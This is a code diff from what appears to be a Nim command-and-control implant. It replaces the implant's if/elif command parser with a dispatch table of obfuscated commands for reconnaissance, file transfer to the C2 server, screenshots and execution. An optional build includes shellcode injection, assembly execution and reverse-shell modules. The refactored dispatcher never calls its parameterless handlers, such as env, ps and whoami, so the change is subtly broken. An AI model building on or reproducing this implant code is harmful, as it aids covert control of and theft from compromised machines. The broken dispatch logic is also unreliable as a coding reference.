@@ -24,56 +24,50 @@ include ../modules/screenshot/[screenshot]
 when defined risky:
     include ../modules/risky/[executeAssembly, inlineExecute, powershell, shell, shinject, reverseShell]
 
+type
+  CommandDispatch = object
+    cmd: string
+    handlerEmpty: proc(): string {.nimcall.}
+    handler: proc(args: seq[string]): string {.nimcall.}
+    handlerWithListener: proc(li: Listener, args: seq[string]): string {.nimcall.}
+    handlerWithListenerAndGuid: proc(li: Listener, cmdGuid: string, args: seq[string]): string {.nimcall.}
+
+var dispatcher = {
+  obf("cat"): CommandDispatch(handler: cat),
+  obf("cd"): CommandDispatch(handler: cd),
+  obf("cp"): CommandDispatch(handler: cp),
+  obf("curl"): CommandDispatch(handlerWithListener: curl),
+  obf("download"): CommandDispatch(handlerWithListenerAndGuid: download),
+  obf("env"): CommandDispatch(handlerEmpty: env),
+  obf("getav"): CommandDispatch(handlerEmpty: getAv),
+  obf("getdom"): CommandDispatch(handlerEmpty: getDom),
+  obf("getlocaladm"): CommandDispatch(handlerEmpty: getLocalAdm),
+  obf("ls"): CommandDispatch(handler: ls),
+  obf("mkdir"): CommandDispatch(handler: mkdir),
+  obf("mv"): CommandDispatch(handler: mv),
+  obf("ps"): CommandDispatch(handlerEmpty: ps),
+  obf("pwd"): CommandDispatch(handlerEmpty: pwd),
+  obf("reg"): CommandDispatch(handler: reg),
+  obf("rm"): CommandDispatch(handler: rm),
+  obf("run"): CommandDispatch(handler: run),
+  obf("screenshot"): CommandDispatch(handler: screenshot),
+  obf("upload"): CommandDispatch(handlerWithListenerAndGuid: upload),
+  obf("wget"): CommandDispatch(handlerWithListener: wget),
+  obf("whoami"): CommandDispatch(handlerEmpty: whoami)
+}.toTable
+
 # Parse user commands that do not affect the listener object here
 proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =
 
     try:
         # Parse the received command
-        # This code isn't too pretty, but using 'case' optimizes away the string obfuscation used here
-        if cmd == obf("cat"):
-            result = cat(args)
-        elif cmd == obf("cd"):
-            result = cd(args)
-        elif cmd == obf("cp"):
-            result = cp(args)
-        elif cmd == obf("curl"):
-            result = curl(li, args)
-        elif cmd == obf("download"):
-            # This is the operator console download command process, 
-            # In our side, implant must UPLOAD a file to C2 (it will download a file to C2 from operator perspective)
-            result = download(li, cmdGuid, args) 
-        elif cmd == obf("env"):
-            result = env()
-        elif cmd == obf("getav"):
-            result = getAv()
-        elif cmd == obf("getdom"):
-            result = getDom()
-        elif cmd == obf("getlocaladm"):
-            result = getLocalAdm()
-        elif cmd == obf("ls"):
-            result = ls(args)
-        elif cmd == obf("mkdir"):
-            result = mkdir(args)
-        elif cmd == obf("mv"):
-            result = mv(args)
-        elif cmd == obf("ps"):
-            result = ps()
-        elif cmd == obf("pwd"):
-            result = pwd()
-        elif cmd == obf("reg"):
-            result = reg(args)
-        elif cmd == obf("rm"):
-            result = rm(args)
-        elif cmd == obf("run"):
-            result = run(args)
-        elif cmd == obf("screenshot"):
-            result = screenshot(args)
-        elif cmd == obf("upload"):
-            result = upload(li, cmdGuid, args)
-        elif cmd == obf("wget"):
-            result = wget(li, args)
-        elif cmd == obf("whoami"):
-            result = whoami()
+        let dispatch = dispatcher.getOrDefault(cmd, CommandDispatch())
+        if dispatch.handlerWithListenerAndGuid != nil:
+            return dispatch.handlerWithListenerAndGuid(li, cmdGuid, args)
+        elif dispatch.handlerWithListener != nil:
+            return dispatch.handlerWithListener(li, args)
+        elif dispatch.handler != nil:
+            return dispatch.handler(args)
         else:
             # Parse risky commands, if enabled
             when defined risky:
